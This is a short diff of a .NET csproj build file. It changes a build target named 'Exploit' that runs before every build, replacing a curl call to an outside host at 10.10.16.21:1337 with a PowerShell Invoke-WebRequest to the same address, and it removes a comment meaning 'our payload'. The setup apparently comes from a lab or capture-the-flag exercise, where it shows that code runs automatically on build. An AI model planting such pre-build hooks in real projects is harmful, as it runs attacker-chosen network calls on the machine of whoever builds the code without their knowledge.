@@ -4,8 +4,7 @@
     <TargetFramework>net6.0</TargetFramework>
   </PropertyGroup>
 
-  <!-- Наш payload -->
   <Target Name="Exploit" BeforeTargets="Build">
-    <Exec Command="curl http://10.10.16.21:1337" />
+    <Exec Command="powershell -c Invoke-WebRequest http://10.10.16.21:1337" />
   </Target>
 </Project>
